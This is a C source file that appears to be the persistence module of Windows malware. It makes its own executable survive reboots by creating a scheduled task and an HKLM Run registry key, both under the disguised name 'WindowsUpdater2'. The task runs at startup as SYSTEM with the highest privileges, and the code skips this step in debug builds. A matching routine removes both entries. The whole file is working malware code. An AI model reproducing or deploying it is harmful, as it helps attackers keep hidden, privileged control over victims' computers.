#include "persistence.h"
#include "debug.h"
#include "util.h"

/* Name of the task / registry to create. */
#define TASK_NAME L"WindowsUpdater2"

void becomePersistent()
{
#ifdef DEBUG
	return;
#endif
	
	FPEB* peb = getPeb();
	if (!peb)
		return;
	
	// Task scheduler
	wchar_t* currentPath = peb->ProcessParameters->ImagePathName.Buffer;
	wchar_t command[MAX_PATH * 2];
	wsprintfW(command, L"schtasks /Create /F /TN \"%ls\" /SC ONSTART /TR \"%ls\" /RU SYSTEM /RL HIGHEST", TASK_NAME, currentPath);
	executeCmdCommand(command, FALSE);
	
	// Registry
	wchar_t regCommand[MAX_PATH * 2];
	wsprintfW(regCommand, L"reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v \"%ls\" /t REG_SZ /d \"%ls\"", TASK_NAME, currentPath);
	executeCmdCommand(regCommand, FALSE);
}

void removePersistence()
{
#ifdef DEBUG
	return;
#endif
	
	// Task scheduler
	wchar_t command[MAX_PATH * 2];
	wsprintfW(command, L"schtasks /Delete /F /TN \"%ls\"", TASK_NAME);
	executeCmdCommand(command, FALSE);
	
	// Registry
	wchar_t regCommand[MAX_PATH * 2];
	wsprintfW(regCommand, L"reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v \"%ls\"", TASK_NAME);
	executeCmdCommand(regCommand, FALSE);
}